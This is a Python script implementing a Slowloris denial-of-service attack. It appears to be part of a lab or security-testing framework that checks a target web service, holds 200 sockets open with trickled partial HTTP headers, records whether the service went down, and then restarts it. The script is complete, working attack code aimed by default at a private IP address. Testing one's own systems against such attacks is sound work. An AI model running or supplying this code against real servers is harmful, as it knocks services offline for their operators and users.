#!/usr/bin/python3

import socket
import sys
import time
import os
import random
import threading

# installed packages
from pwn import *
import argparse

# declare script path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# custom package
import pre_settings
import pre_ping_check
import pre_services_check
import pre_attacks
import pre_services_restart

# displays only critical errors or important information
context.log_level = pre_settings.debug_critical

def create_socket(rhost, rport):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((rhost, rport))
        s.sendall(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode('utf-8'))
        s.sendall(f"Host: {rhost}\r\n".encode('utf-8'))
        return s
    except (socket.timeout, socket.error, Exception) as e:
        log.error(str(e))

def close_sockets(sockets):
    for sock in sockets:
        try:
            sock.close()
        except (socket.timeout, socket.error, Exception) as e:
            log.error(str(e))

def exploit(rhost, rport, attacks, num_sockets, sleep_buffer):
    try:
        status_ping = pre_ping_check.check(rhost)
        status_service_pre = pre_services_check.check(rhost, rport)

        if not status_service_pre:
            log.info(pre_settings.print_status_service_cleanup(rport, attacks['service'], status_service_pre, 'pre'))
            status_pre_service_restart = pre_services_restart.restart_service(rhost, attacks["path"])
            time.sleep(3)

        status_service_pre = pre_services_check.check(rhost, rport)
        status_service_pre_check = pre_services_check.check_http(rhost, rport)

        attacks['status (ping)'] = 'UP' if status_ping else 'DOWN'
        attacks['status (service)'] = 'UP' if status_service_pre else 'DOWN'

        if status_service_pre and status_service_pre_check:
            sockets = []
            
            # Start creating sockets for the Slowloris attack
            for _ in range(num_sockets):
                sock = create_socket(rhost, rport)
                if sock:
                    sockets.append(sock)

            log.info(f"{len(sockets)} sockets created. Sending headers intermittently...")

            max_attempts = 3  # Define a maximum number of retries for the attack
            attempts = 0  # Counter to track the number of attempts

            while attempts < max_attempts:
                for sock in list(sockets):
                    try:
                        sock.sendall(f"X-a: {random.randint(1, 5000)}\r\n".encode('utf-8'))
                    except socket.error:
                        sockets.remove(sock)

                # Replenish the socket pool if needed
                for _ in range(num_sockets - len(sockets)):
                    sock = create_socket(rhost, rport)
                    if sock:
                        sockets.append(sock)

                log.info(f"Active sockets: {len(sockets)}")

                time.sleep(sleep_buffer)

                # After the sleep buffer, check the service status again
                status_service_post = pre_services_check.check_http(rhost, rport)
                status_attack = not status_service_post  # Attack is successful if service is down

                log.info(f'status_service_post: {status_service_post} | status_attack: {status_attack}')

                if status_attack:
                    attacks['status (attack)'] = 'UNBLOCKED'
                    attacks['remark'] = pre_attacks.success_dos
                    break  # Exit the loop when the attack succeeds (service is down)

                else:
                    attacks['remark'] = pre_attacks.fail_dos

                    # Increment the attempt counter
                    attempts += 1

                    # If the attack fails for the max attempts, break the loop
                    if attempts >= max_attempts:
                        log.info(f"DoS attack failed after {max_attempts} attempts. Stopping the attack.")
                        break  # Exit the loop if max attempts are reached

            close_sockets(sockets)

            # cleanup and restart the service
            time.sleep(2)
            log.info(pre_settings.print_status_service_cleanup(rport, attacks['service'], pre_services_check.check(rhost, rport), 'cleanup'))
            status_post_service_restart = pre_services_restart.restart_service(rhost, attacks["path"])

            print(pre_settings.print_status_attack(rhost, rport, attacks['service'], attacks['attack'], attacks['type'], status_ping, status_service_pre, status_attack, status_service_post, attacks['remark']))
            return attacks

        else:
            attacks['remark'] = pre_attacks.fail_service_down
            print(pre_settings.print_status_attack(rhost, rport, attacks['service'], attacks['attack'], attacks['type'], status_ping, status_service_pre, False, status_service_pre, attacks['remark']))

            return attacks

    except KeyboardInterrupt:
        sys.exit(0)

    except (socket.timeout, socket.error, Exception) as e:
        close_sockets(sockets)
        sys.exit(1)

def main():
    try:
        attacks = pre_attacks.attacks.get('dos_slowloris')

        parser = argparse.ArgumentParser(description=pre_settings.print_argparse_desc(attacks['attack']), epilog=f'{pre_settings.print_argparse_epilog(f"python3 {sys.argv[0]} --rhost 10.251.5.5")}')
        parser.add_argument('--rhost', help='Target IP', default='10.251.5.5')
        args = parser.parse_args()

        rhost = args.rhost
        rport = attacks['port']

        exploit(rhost, rport, attacks, num_sockets=200, sleep_buffer=20)

    except KeyboardInterrupt:
        sys.exit(0)

if __name__ == '__main__':
    main()